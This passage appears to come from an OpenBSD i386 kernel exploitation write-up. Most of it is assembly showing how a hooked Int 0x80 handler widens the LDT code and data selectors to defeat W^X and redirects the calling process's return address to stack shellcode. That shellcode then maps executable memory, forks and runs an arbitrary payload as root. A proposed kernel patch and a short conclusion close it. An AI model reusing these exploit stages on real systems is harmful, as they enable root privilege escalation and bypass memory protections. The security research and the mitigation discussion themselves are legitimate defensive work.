#### Assembly Code and LDT Manipulation
```assembly
mov edx, [ebx + eax]         ; Load base_low into EDX
mov ecx, [ebx + eax + 0x4]   ; Load base_middle into ECX
shr edx, 16                  ; Shift right to get base_low in EDX
mov eax, ecx
shl eax, 24                  ; Shift left to get base_middle in EAX
or edx, eax                  ; Combine base_low and base_middle
mov eax, ecx                 ; Reload base_middle into EAX
and eax, 0xff000000          ; Isolate base_high
or edx, eax                  ; Combine all parts into EDX
mov ebx, edx                 ; Store the final LDT position in EBX
```

The Global Descriptor Table (GDT) is organized similarly to the Interrupt Descriptor Table (IDT), with addresses that are not contiguous in memory. The final instruction places the real LDT position in the EBX register. This table contains the information needed to bypass OpenBSD protections.

#### Extending Selector Lengths
To extend the length of the DS and CS selectors, we use the following instructions:
```assembly
; Extend CS selector
or dword [ebx + 0x1c], 0x000f0000

; Extend DS selector
or dword [ebx + 0x24], 0x000f0000
```
Bits 16-20 in the selector range (which is not contiguous in the LDT entry) are modified to cover the entire address space from 0 to 4 GB, similar to Windows NT. This allows code execution anywhere in the process.

#### Modifying the Return Address
Next, we change the return address of the `Int 0x80` call to a position on the stack:
```assembly
; Return to stack
mov edi, [esp + 8]           ; Get the current system call return address
add edi, STACK_SAVE_LEN      ; Adjust for the stack save length
mov ebx, [esp + RETURN_ADDRESS] ; Backup the original return address
mov [esp + RETURN_ADDRESS], edi ; Set the new return address
```
The current system call return address is stored in EDI, and the original return address is backed up in EBX.

#### Copying User-Mode ShellCode
We then copy the user-mode shellcode to the return position:
```assembly
push edi
push esi
add esi, 0xd5                ; USER_SHELLCODE offset
mov ecx, SC_LEN              ; USER_SHELLCODE length in dwords
rep movsd                    ; Copy the shellcode
pop esi
pop edi
mov [edi + 1], ebx           ; Write the real return address
```

#### Restoring the Original Int 0x80 Vector
Finally, we restore the original `Int 0x80` vector:
```assembly
; --- Restore Xsyscall
sub esp, 0x7f
sidt [esp + 4]
mov ebx, [esp + 6]
add esp, 0x7f
mov edx, [ebx + 0x400]
mov ecx, [ebx + 0x404]
mov eax, [esi + 0x1bf]       ; EAX <- Position of old System Call
push eax
and eax, 0x0000ffff
and edx, 0xffff0000
or edx, eax
mov [ebx + 0x400], edx       ; Fill MSB of System call address
pop eax
and eax, 0xffff0000
and ecx, 0x0000ffff
or ecx, eax
mov [ebx + 0x404], ecx       ; Fill LSB of System call address
```

#### Continuing with the Original Syscall
```assembly
; Fix selectors
push fs
pop ds
push fs
pop es
popa                         ; Restore all registers
jmp 0xFFFFFFFF               ; Placeholder for the real system call
```
The system is now released from the hook and continues normally, except for the calling process, which will return to the stack and execute the user-mode shellcode.

### Context-Switch Limit
There is a limit on the user-mode shellcode execution: during the next context switch, the LDT will be restored, and the code executing on the stack will no longer be permitted to run. The shellcode must exit the stack region immediately to avoid a SEGFAULT. Modern computers provide sufficient time to fork, claim memory, and exit, making this a manageable issue.

### User ShellCode
The user-shell code allows us to execute any system call as root, but there are two main disadvantages:
1. The process will stop normal operation and start executing our code, which may not be ideal if the injected process is critical.
2. We have a short time to execute before being context-switched, so we must copy the shellcode to a more secure area.

#### Pseudo Code
1. Request a chunk of executable and writable memory using the `mmap` system call.
2. Copy the rest of the shellcode and continue execution in this region.
3. Perform a `FORK` system call.
4. In the child process, continue executing the final payload.
5. In the parent process, return to the original call.

#### Detailed Operation
1. **Request Memory**:
    ```assembly
    ; mmap
    xor eax, eax
    push eax                     ; offset 0
    push byte -1                 ; fd
    push ax
    push word 0x1002             ; MAP_ANON | MAP_PRIVATE
    push byte 7                  ; PROT_READ+PROT_WRITE+PROT_EXEC
    push dword 0x1000            ; size (4096 bytes)
    push eax                     ; address = 0
    push eax                     ; NULL
    mov al, 0xc5
    mov ebx, esp
    int 0x80
    ```

2. **Copy Shellcode and Jump**:
    ```assembly
    ; Copy to executable region
    mov edi, eax
    mov ecx, SC_LEN
    CALL GETEIP2
    GETEIP2:
    pop esi
    add esi, byte 0x8
    rep movsd
    jmp eax
    ```

3. **Fork System Call**:
    ```assembly
    xor eax, eax
    mov al, byte 2
    int 0x80
    test eax, eax
    je FINAL_PAYLOAD
    popf
    popa
    ret                         ; return to parent process
    FINAL_PAYLOAD:
    ;/// Put final payload here!!
    ```

### Failed Attempts
Several attempts were made before reaching the final solution:
- **Kernel Mode System Calls**: Attempting to make system calls from kernel mode did not work due to unknown reasons and caused issues in VMware images.
- **Writing to .TEXT Section**: Setting the CR2 flag to disable page-protection mechanisms allowed writing to the .TEXT section, but this trashed the ELF file on disk, rendering the trick ineffective.

### Proposed Protection
A possible fix is to implement kernel-level protection similar to W^X. This can be done by reducing the size of the kernel's code and interrupt code selectors. For example, in `sys/arch/i386/i386/machdep.c`:
```c
- setsegment(&gdt[GCODE_SEL].sd, 0, 0xfffff, SDT_MEMERA, SEL_KPL, 1, 1);
- setsegment(&gdt[GICODE_SEL].sd, 0, 0xfffff, SDT_MEMERA, SEL_KPL, 1, 1);
+ setsegment(&gdt[GCODE_SEL].sd, 0, 0xd1000, SDT_MEMERA, SEL_KPL, 1, 1);
+ setsegment(&gdt[GICODE_SEL].sd, 0, 0xd1000, SDT_MEMERA, SEL_KPL, 1, 1);
```
This modification limits the executable region, providing some protection against kernel attacks.

### Conclusion
This exercise demonstrated the complexity of kernel-mode programming and the importance of robust security measures. Even the most secure systems can contain vulnerabilities, and adding kernel-mode protections is essential, especially on security-oriented platforms.
